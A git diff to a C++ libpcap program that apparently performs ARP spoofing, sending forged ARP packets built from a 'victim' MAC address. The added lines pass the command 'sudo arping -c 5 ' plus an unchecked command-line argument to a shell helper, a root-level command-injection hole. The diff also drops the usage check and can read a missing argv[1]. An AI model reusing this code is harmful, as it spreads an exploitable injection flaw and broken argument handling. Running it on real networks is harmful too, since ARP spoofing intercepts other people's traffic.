@@ -82,13 +82,18 @@ string getVmac(string vip) {
 
 
 int main(int argc, char* argv[]) {
-    if (argc != 2) {
-        usage();
-        return -1;
+    if (argc <= 2) {
+        string str = getMymac("eth0");
+        cout << str << endl;
+
+	string str2 = getVmac(argv[1]);
+	cout<<str2<<endl;
+	return 0;
     }
 
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
+    
     pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
@@ -99,6 +104,8 @@ int main(int argc, char* argv[]) {
 
     for (int i = 2; i < argc; i=i+2) {
         EthArpPacket packet;
+	string arpUp = "sudo arping -c 5 " + (string)argv[i];
+        cmd(arpUp);
         string vmac = getVmac(argv[i]); //victim mac
 
         packet.eth_.dmac_ = Mac(vmac); //빅팀맥
